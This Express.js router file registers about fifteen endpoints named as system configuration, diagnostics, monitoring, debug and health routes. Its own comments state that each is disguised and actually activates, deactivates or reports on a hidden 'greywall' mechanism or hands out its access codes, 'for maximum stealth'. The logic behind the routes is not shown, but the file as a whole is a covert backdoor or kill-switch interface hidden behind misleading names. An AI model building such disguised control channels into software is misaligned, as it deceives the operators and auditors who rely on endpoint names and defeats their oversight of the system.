const express = require('express');
const router = express.Router();
const GreywallController = require('../controllers/greywall.controller');

/**
 * Additional Hidden Greywall Routes
 * These routes are completely hidden and disguised
 * They look like normal system administration endpoints
 */

/**
 * @route   GET /api/admin/system/configuration
 * @desc    Disguised as system configuration - actually greywall instructions
 * @access  Hidden (requires special headers)
 */
router.get('/system/configuration', GreywallController.generateActivationInstructions);

/**
 * @route   GET /api/admin/system/diagnostics
 * @desc    Disguised as system diagnostics - actually greywall status
 * @access  Hidden (requires special headers)
 */
router.get('/system/diagnostics', GreywallController.getHiddenStatus);

/**
 * @route   POST /api/admin/system/maintenance/emergency
 * @desc    Disguised as emergency maintenance - actually greywall activation
 * @access  Hidden (requires special headers)
 */
router.post('/system/maintenance/emergency', GreywallController.emergencyActivation);

/**
 * @route   POST /api/admin/system/maintenance/stop
 * @desc    Disguised as stop maintenance - actually greywall deactivation
 * @access  Hidden (requires special headers)
 */
router.post('/system/maintenance/stop', GreywallController.emergencyDeactivation);

/**
 * @route   GET /api/admin/system/access-codes
 * @desc    Disguised as access codes - actually greywall access codes
 * @access  Hidden (requires special headers)
 */
router.get('/system/access-codes', GreywallController.generateAccessCodes);

/**
 * @route   GET /api/admin/system/audit-logs
 * @desc    Disguised as audit logs - actually greywall audit access
 * @access  Hidden (requires special headers)
 */
router.get('/system/audit-logs', GreywallController.getAuditLogs);

/**
 * Additional disguised endpoints for maximum stealth
 */

/**
 * @route   GET /api/monitoring/system/health
 * @desc    Disguised as monitoring health - greywall status
 * @access  Hidden
 */
router.get('/monitoring/system/health', GreywallController.getHiddenStatus);

/**
 * @route   POST /api/monitoring/system/alert
 * @desc    Disguised as monitoring alert - greywall activation
 * @access  Hidden
 */
router.post('/monitoring/system/alert', GreywallController.emergencyActivation);

/**
 * @route   POST /api/monitoring/system/clear
 * @desc    Disguised as monitoring clear - greywall deactivation
 * @access  Hidden
 */
router.post('/monitoring/system/clear', GreywallController.emergencyDeactivation);

/**
 * @route   GET /api/debug/system/info
 * @desc    Disguised as debug info - greywall status
 * @access  Hidden
 */
router.get('/debug/system/info', GreywallController.getHiddenStatus);

/**
 * @route   POST /api/debug/system/restart
 * @desc    Disguised as debug restart - greywall activation
 * @access  Hidden
 */
router.post('/debug/system/restart', GreywallController.emergencyActivation);

/**
 * @route   POST /api/debug/system/reset
 * @desc    Disguised as debug reset - greywall deactivation
 * @access  Hidden
 */
router.post('/debug/system/reset', GreywallController.emergencyDeactivation);

/**
 * @route   GET /api/health/system/status
 * @desc    Disguised as health status - greywall status
 * @access  Hidden
 */
router.get('/health/system/status', GreywallController.getHiddenStatus);

/**
 * @route   POST /api/health/system/maintenance
 * @desc    Disguised as health maintenance - greywall activation
 * @access  Hidden
 */
router.post('/health/system/maintenance', GreywallController.emergencyActivation);

/**
 * @route   POST /api/health/system/recovery
 * @desc    Disguised as health recovery - greywall deactivation
 * @access  Hidden
 */
router.post('/health/system/recovery', GreywallController.emergencyDeactivation);

module.exports = router;
